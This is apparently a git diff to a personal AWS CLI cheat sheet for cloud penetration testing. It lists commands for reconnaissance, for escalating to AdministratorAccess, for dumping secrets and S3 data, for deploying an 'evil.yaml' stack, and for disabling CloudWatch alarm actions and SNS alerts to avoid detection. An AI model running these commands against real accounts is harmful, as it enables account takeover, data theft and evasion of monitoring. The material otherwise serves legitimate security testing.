@@ -1,4 +1,5 @@
 ## caller id
+who is me
 ```
 aws sts get-caller-identity
 ```
@@ -31,6 +32,7 @@ aws iam get-role-policy --role-name ... --policy-name ...
 ```
 
 ## attach a policy
+attach aws admin policies
 ```
 aws iam attach-user-policy --user-name user-example --policy-arn ...
 aws iam attach-user-policy --user-name user-example --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
@@ -38,6 +40,7 @@ aws iam attach-group-policy --group-name developer --policy-arn arn:aws:iam::aws
 ```
 
 ## add admin policy
+add custom policy .json to group,role (needs your own policy file obviously)
 ```
 aws iam create-policy-version --policy-arn arn:aws:iam::666666666666:policy/Print --policy-document file:///.../newAdminPolicy.json --set-as-default
 aws iam put-group-policy --group-name Admins --policy-document file:///.../newAdminPolicy.json --policy-name AdminRoot
@@ -56,6 +59,7 @@ aws sts assume-role --role-arn arn:aws:iam::666666666666:role/ad-example --role-
 ```
 
 ## search for adminstuff
+works with a lot of aws cli list queries
 ```
 aws iam list-policies | grep 'AdministratorAccess'  
 ```
@@ -69,6 +73,7 @@ aws iam create-access-key --user-name Bob
 ```
 
 ## EC2, list, deploy, secu group
+
 ```
 aws ec2 describe-subnets
 aws ec2 describe-security-groups
@@ -100,6 +105,7 @@ aws secretsmanager get-secret-value --secret-id ...--region
 ```
 
 ## s3
+list buckets, get objects, acl and policy
 ```
 aws s3 ls
 aws s3api list-buckets
@@ -107,14 +113,20 @@ aws s3 sync s3://user-resources-12jljlaj3434ljalsjf/ ./
 aws s3api list-objects --bucket ...
 aws s3 --no-sign-request --region ap-southeast-1 ls s3://static-resources-example
 aws s3api get-bucket-policy --bucket ... --output text | python -m json.tool
-aws s3api put-bucket-policy --bucket ... --policy file://policy.json
 aws s3api get-bucket-acl --bucket ... > acl.json
-aws s3api put-bucket-acl --bucket --access-control-policy file://acl.json
 aws s3api get-object-acl --bucket ... --key secret_object > object.json
+
+```
+## S3 add policy, acl
+add your own policy or acl file to bucket/object
+```
+aws s3api put-bucket-policy --bucket ... --policy file://policy.json
 aws s3api put-object-acl --bucket ... --key secret_object --access-control-policy file://object.json
+aws s3api put-bucket-acl --bucket --access-control-policy file://acl.json
 ```
 
 ## API
+list, show rest-api, ressources method and key
 ```
 aws apigateway get-account
 aws apigateway get-rest-apis
@@ -126,8 +138,11 @@ aws apigateway get-method --rest-api-id ... --http-method GET --ressource-id ...
 
 ## lambda
 ```
-aws lambda get-function --function-name DynamoFunction  
 aws lambda list-functions
+aws lambda get-function --function-name DynamoFunction  
+aws lambda get-policy --function-name pawsitivty
+
+
 aws lambda invoke --function-name evil-function output.txt
 ```
 
@@ -136,18 +151,24 @@ aws lambda invoke --function-name evil-function output.txt
 aws cloudformation list-stack-resources --stack-name weatherman
 aws cloudformation describe-stack-events --stack-name intensification90
 aws cloudformation get-template --stack-name stackmanfred
+
+```
+## Cloudformation deploy
+```
 aws cloudformation validate-template --template-body file://evil.yaml
 aws cloudformation create-stack --template-body file://evil.yaml --stack-name stolenstack --parameters ParameterKey=uri,ParameterValue=$uri --output text
 aws cloudformation describe-stacks --stack-name stolenstack  --query Stacks[*].Outputs --output text
 aws cloudformation delete-stack --stack-name stolenstack --output text
 ```
 
-## Wiuuu wiuuu cloudwatch, snes
+## Wiuuu wiuuu cloudwatch, sns
 ```
 aws cloudwatch describe-alarms --alarm-names "soundofdapolice"
 aws sns list-topics
 aws sns list-subscriptions
-# no more wiuu 
+```
+```
+## less wiuu wiuu
 aws cloudwatch disable-alarm-actions --alarm-names soundofdapolice
 aws cloudwatch describe-alarm-history --alarm-name "iamshadow" --history-item-type StateUpdate
 aws sns unsubscribe --subscription-arn arn:aws:sns:us-west-2:666666666666:my-topic:somerandomstring
